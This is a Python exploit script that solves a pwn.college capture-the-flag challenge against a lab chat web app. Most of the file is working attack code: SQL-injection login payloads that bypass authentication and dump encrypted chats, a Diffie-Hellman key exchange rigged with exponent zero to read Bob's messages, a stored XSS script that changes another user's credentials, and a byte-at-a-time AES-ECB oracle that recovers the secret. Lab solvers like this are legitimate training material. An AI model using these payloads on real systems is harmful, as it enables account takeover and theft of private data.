import os
import re
import sys
import pwn
import time
import requests
import Crypto.Cipher.AES
import Crypto.Util.Padding
import scapy.layers.tls.crypto.groups

API = "http://10.0.0.1:80"
DH_p = scapy.layers.tls.crypto.groups.modp2048.m
DH_g = scapy.layers.tls.crypto.groups.modp2048.g


def login_as(username: str) -> requests.Session:
    session = requests.Session()
    if username == "alice":
        injected_username = "' UNION SELECT 'alice','irrelevant',0-- "
    else:
        injected_username = f"{username}'-- "
    login_payload = {"username": injected_username, "password": "password"}
    session.post(f"{API}/login", data=login_payload)
    return session


def check_password(username: str, password: str) -> bool:
    login_payload = {"username": username, "password": password}
    response = requests.post(f"{API}/login", data=login_payload)
    return response.status_code == 200


def send_message(session: requests.Session, peer: str, message: str):
    session.post(f"{API}/chat/{peer}", data={"message": message})


def receive_message(session: requests.Session, peer: str) -> str:
    response = session.get(f"{API}/chat/{peer}")
    return response.text


def extract_encrypted_chats():
    injected_username = (
        "' UNION SELECT encrypted_contents, 'password', false "
        "from encrypted_chats where encrypted_username_1 is null or encrypted_username_2 is null"
        "-- "
    )
    login_payload = {"username": injected_username, "password": "password"}
    response = requests.post(f"{API}/login", data=login_payload)
    if match := re.search(r"Hello (.*)!", response.text):
        return match.group(1)
    raise Exception(f"encrypted chats not found in response: {response.text}")


def crack_aes_ecb(encrypt_oracle):
    import string

    BLOCK_SIZE = 16

    flag = b": The flag is pwn.college{"
    guess_idx = len(flag)
    guess_len = 1
    charset = string.ascii_letters + string.digits + "-_: {.}"
    charset = [bytes([c]) for c in charset.encode()]

    with pwn.log.progress("Recovering Flag") as progress:
        while True:
            pad_len = BLOCK_SIZE - (guess_idx % BLOCK_SIZE) - guess_len
            pad_data = b"a" * pad_len

            def encrypt_oracle_non_empty(payload):
                if pad_len == 0:
                    payload = b"b" * BLOCK_SIZE + payload
                ciphers = encrypt_oracle(payload)
                if pad_len == 0:
                    ciphers = ciphers[BLOCK_SIZE:]
                return ciphers

            target_cipher = encrypt_oracle_non_empty(pad_data)
            target_start = (guess_idx // BLOCK_SIZE) * BLOCK_SIZE
            target_block = target_cipher[target_start : target_start + BLOCK_SIZE]

            known_prefix = (pad_data + flag)[-BLOCK_SIZE + guess_len :]
            guess_payload = b"".join(known_prefix + c for c in charset)

            guess_cipher = encrypt_oracle_non_empty(guess_payload)
            for i, guess_char in enumerate(charset):
                char_start = i * BLOCK_SIZE
                char_block = guess_cipher[char_start : char_start + BLOCK_SIZE]
                if char_block == target_block:
                    flag += guess_char
                    progress.status(flag.decode())
                    break
            else:
                break

            guess_idx += 1

        progress.success(f"Flag: {flag.decode()}")


def touch_alice_and_bob():
    session = login_as("mallory")
    send_message(session, "alice", "I heard someone shared the flag with Bob!")


def reveal_sharon_username():
    session = login_as("alice")
    dh_a = 0
    dh_A = pow(DH_g, dh_a, mod=DH_p)
    opening_message = (
        "Hey Bob, I need to chat with you about something important. "
        f"Let's chat securely over DHE-AES: {dh_A}."
    )
    send_message(session, "bob", opening_message)

    while True:
        if match := re.search(
            r"^bob: Hey Alice, sure: (\d+)\.$",
            receive_message(session, "bob"),
            re.MULTILINE,
        ):
            dh_B = int(match.group(1))
            break
        time.sleep(0.5)

    dh_s = pow(dh_B, dh_a, mod=DH_p)
    aes_key = dh_s.to_bytes(256, "big")[:16]

    cipher_send = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_ECB)
    cipher_recv = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_ECB)

    def encrypt(data):
        return cipher_send.encrypt(
            Crypto.Util.Padding.pad(data.encode(), cipher_send.block_size)
        ).hex()

    def decrypt(data):
        return Crypto.Util.Padding.unpad(
            cipher_recv.decrypt(bytes.fromhex(data)),
            cipher_recv.block_size,
        ).decode()

    question = "Hey Bob, I know that someone shared the flag with you. Who was it?"
    send_message(session, "bob", encrypt(question))

    while True:
        chat_text = receive_message(session, "bob")
        for encrypted_message in re.findall(
            r"^bob: ([0-9a-f]+)$", chat_text, re.MULTILINE
        ):
            try:
                decrypted_message = decrypt(encrypted_message)
                print(f"{decrypted_message=}")
            except Exception:
                continue
            if match := re.search(
                r"Oh, it was '(.+?)'\.",
                decrypted_message,
            ):
                return match.group(1)
        time.sleep(2)


def change_username(old_name, new_name):
    alice_listen_on = f"mallory"
    xss_payload = f"""
<script>(() => {{
const send = (url, obj) => fetch(url, {{method:'POST', body: new URLSearchParams(obj)}});
send('/user/{old_name}/modify', {{'username': '{new_name}', 'password': 'password'}});
}})();</script>
"""
    pwn.info(f"Changing {old_name} to {new_name} via XSS")
    session = login_as(alice_listen_on)
    send_message(session, "alice", xss_payload)
    while not check_password(new_name, "password"):
        pwn.sleep(1)


def tee(process: pwn.tube):
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw


def hack():
    touch_alice_and_bob()
    sharon_username = reveal_sharon_username()
    pwn.info(f"Sharon's username: {sharon_username}")

    chat_bytes = extract_encrypted_chats()
    pwn.info(f"Got encrypted chat1: {chat_bytes}")
    change_username("bob", sharon_username)

    def encrypt_oracle(payload: bytes) -> bytes:
        nonlocal sharon_username
        new_sharon_name = payload.decode()
        change_username(sharon_username, new_sharon_name)
        sharon_username = new_sharon_name
        chat_bytes = extract_encrypted_chats()
        return bytes.fromhex(chat_bytes)

    crack_aes_ecb(encrypt_oracle)
    print("FLAG IS GOTTEN")


def boot():
    remote_script = "/tmp/pwnsolver.py"

    with pwn.process(["/challenge/run"]) as io:
        tee(io)
        # wait for signal of bootup completion
        io.recvuntil(b"\r")
        io.info("Starting the hacking script...")
        io.sendline(f"python3 {remote_script} hack".encode())
        # keep triggering tee's recv_raw until it receives the stop signal
        io.recvuntil(b"FLAG IS GOTTEN")
        # send EOF to stop the process
        io.shutdown()
        io.info("Done! Check the output above for the flag.")


def main():
    remote_script = "/tmp/pwnsolver.py"
    # raw to skip checksec
    ssh = pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True)
    local_script = os.path.abspath(__file__)
    ssh.upload(local_script, remote_script)
    argv = ["/run/dojo/bin/python3", remote_script]
    # requires patch from https://github.com/Gallopsled/pwntools/pull/2627 on Python 3.14+
    io: pwn.tubes.ssh.ssh_process
    io = ssh.process(argv, argv[0], aslr=True)  # type: ignore
    tee(io)
    # keep triggering tee's recv_raw until remote process joins
    try:
        io.recvrepeat()
    except KeyboardInterrupt:
        if io.pid:
            ssh.system(f"kill {io.pid}").wait()
        io.kill()
    else:
        io.wait()


if __name__ == "__main__":
    if sys.argv[1:2] == ["hack"]:
        hack()
    elif os.environ.get("DOJO_AUTH_TOKEN"):
        boot()
    else:
        main()
